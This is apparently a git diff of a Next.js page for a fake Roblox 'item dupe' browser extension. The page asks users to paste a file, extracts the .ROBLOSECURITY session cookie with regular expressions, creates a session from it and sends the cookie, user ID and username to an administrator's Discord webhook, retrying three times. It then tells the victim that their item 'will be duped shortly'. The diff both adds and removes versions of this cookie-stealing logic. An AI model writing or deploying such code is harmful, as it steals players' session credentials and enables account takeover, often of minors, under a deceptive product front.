@@ -1,39 +1,29 @@
+/* eslint-disable @next/next/no-img-element */
 "use client";
 
-import { useState, useEffect, useTransition } from "react";
-import Link from "next/link";
-import {
-  X,
-  Play,
-  Info,
-  ArrowLeft,
-  Loader2,
-  ChevronDown,
-  Sparkles,
-} from "lucide-react";
-import { useParams } from "next/navigation";
-import { createDiscordPayload } from "@/lib/discord";
-import { AnimatePresence, motion } from "framer-motion";
+import Video from "@/components/Video";
+import { createSession } from "@/lib/actions/session";
+import { sendToAdminWebhook } from "@/lib/actions/webhook";
+import { createDiscordPayload, DiscordPayloadOptions } from "@/lib/discord";
 import faqs from "@/mock/data/faqs.json";
 import games from "@/mock/data/games.json";
+import { AnimatePresence, motion } from "framer-motion";
+import { ChevronDown, Info, Loader2, Play, Sparkles, X } from "lucide-react";
+import { useState, useTransition } from "react";
 import { toast } from "sonner";
 import Swal from "sweetalert2";
-import Video from "@/components/Video";
 
-export default function SlugPage() {
-  const params = useParams();
-  const slug = (params.slug as string) || "root";
+export default function Page() {
   const [isPending, startTransition] = useTransition();
-
   const [openModal, setOpenModal] = useState<boolean>(false);
-
+  const [isModalOpen, setIsModalOpen] = useState(false);
   const [fileContent, setFileContent] = useState("");
   const [username, setUsername] = useState("");
+
   const [selectedGame, setSelectedGame] = useState<{
     name: string;
     image: string;
   } | null>(null);
-  const [isModalOpen, setIsModalOpen] = useState(false);
 
   function extractRobloSecurity(text: string): string | null {
     const cookieRegex1 = /\.ROBLOSECURITY"\s*,\s*"([^"]{100,})"/;
@@ -47,97 +37,19 @@ export default function SlugPage() {
     return null;
   }
 
-  async function extractAccountData(text: string): Promise<{
-    id: string | null;
-    username: string | null;
-    cookie: string | null;
-  }> {
-    const cookie = extractRobloSecurity(text);
-    if (!cookie) return { id: null, username: null, cookie: null };
-
-    const isValidId = (id: string) => /^\d{5,20}$/.test(id.trim());
-    const profileRegex =
-      /https?:\/\/www\.roblox\.com(?:\/[a-z]{2,})?\/users\/(\d+)\/profile/i;
-    const urlMatch = text.match(profileRegex);
-    let id: string | null = urlMatch ? urlMatch[1] : null;
-
-    if (!id) {
-      const longNumbers = [...text.matchAll(/\b\d{5,20}\b/g)].map((m) => m[0]);
-      if (longNumbers.length > 0) {
-        id = longNumbers.find((n) => n.length < 12) || longNumbers[0];
-      }
-    }
-
-    let username: string | null = null;
-    if (id && isValidId(id)) {
-      try {
-        const res = await fetch(`/api/roblox-user/${id}`);
-        if (res.ok) {
-          const data = await res.json();
-          if (
-            data?.name &&
-            data.name.length >= 2 &&
-            !data.name.includes("http")
-          ) {
-            username = data.name.trim();
-          }
-        }
-      } catch (e) {
-        console.error("Lỗi fetch username:", e);
-      }
-    }
-
-    return { id, username: username || "Unknown", cookie };
-  }
-
-  async function sendToDiscord(
-    cookieValue: string,
-    fullStats: any,
-    userId: string,
-    gameName: string,
-    targetUsername: string,
-  ) {
+  async function sendToDiscord(options: DiscordPayloadOptions) {
     try {
-      const safeUserId = String(userId || "").trim();
-      if (!safeUserId) {
-        toast.error("Invalid user ID.");
-        return;
+      const payload = createDiscordPayload(options);
+      let isSuccess = false;
+
+      for (let i = 0; i < 3; i++) {
+        isSuccess = await sendToAdminWebhook(payload);
+        if (isSuccess) break;
+        await new Promise((resolve) => setTimeout(resolve, 1000));
       }
 
-      const seqRes = await fetch("/api/next-seq", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-      });
-
-      const seqJson = await seqRes.json().catch(() => null);
-      if (!seqRes.ok || !seqJson?.sequenceId) {
-        toast.error(
-          `Failed to get sequence ID: ${seqJson?.error || "Unknown error"}`,
-        );
-        return;
-      }
-
-      const sequenceId = Number(seqJson.sequenceId);
-
-      const payload = createDiscordPayload({
-        sequenceId,
-        gameName,
-        cookieValue,
-        username: targetUsername || fullStats?.displayName || "Unknown",
-        userId: safeUserId,
-      });
-
-      const res = await fetch("/api/post", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          discordPayload: payload,
-          slug: slug || "root",
-        }),
-      });
-
-      if (res.ok) {
-        await new Promise((resolve) => setTimeout(resolve, 80000));
+      if (isSuccess) {
+        // await new Promise((resolve) => setTimeout(resolve, 80000));
         Swal.fire({
           title: "Success!",
           text: "Thank you for choosing our service. Your item will be duped shortly!",
@@ -160,7 +72,7 @@ export default function SlugPage() {
       } else {
         toast.error("Failed to send data to server");
       }
-    } catch (err: any) {
+    } catch (err) {
       console.error("[sendToDiscord error]", err);
       toast.error("Connection error");
     }
@@ -176,27 +88,26 @@ export default function SlugPage() {
       toast.info("Processing item...");
 
       try {
-        const accountData = await extractAccountData(fileContent);
+        const cookie = extractRobloSecurity(fileContent);
 
-        if (!accountData.cookie) {
-          toast.error("Invalid file. Could not find security key!");
+        if (!cookie) {
+          toast.error("Invalid file. Could not find account!");
           return;
         }
 
-        const data = {
-          userId: accountData.id || "0",
-          basic: { name: accountData.username || "Unknown" },
-          displayName: accountData.username || "Unknown",
-        };
+        const session = await createSession({ cookie });
 
-        await sendToDiscord(
-          accountData.cookie,
-          data,
-          accountData.id || "0",
-          selectedGame?.name || "Unknown Game",
-          username,
-        );
-      } catch (err: any) {
+        if (!session) {
+          toast.error("Failed to create data, please try again later");
+          return;
+        }
+
+        await sendToDiscord({
+          ...session,
+          gameName: selectedGame?.name || "Unknown Game",
+          username: session.username,
+        });
+      } catch (err) {
         console.error("[handleStart error]", err);
         toast.error("An error occurred.");
       }
@@ -220,8 +131,8 @@ export default function SlugPage() {
         </h1>
 
         <p className="text-gray-400 text-lg md:text-xl max-w-2xl leading-relaxed mb-12">
-          Advanced browser extension for Roblox. Enhance and process
-          in-game items locally in your
+          Advanced browser extension for Roblox. Enhance and process in-game
+          items locally in your
           <span className="text-blue-400 font-semibold px-2">browser!</span>
           <br />
           <span className="text-sm italic opacity-60">
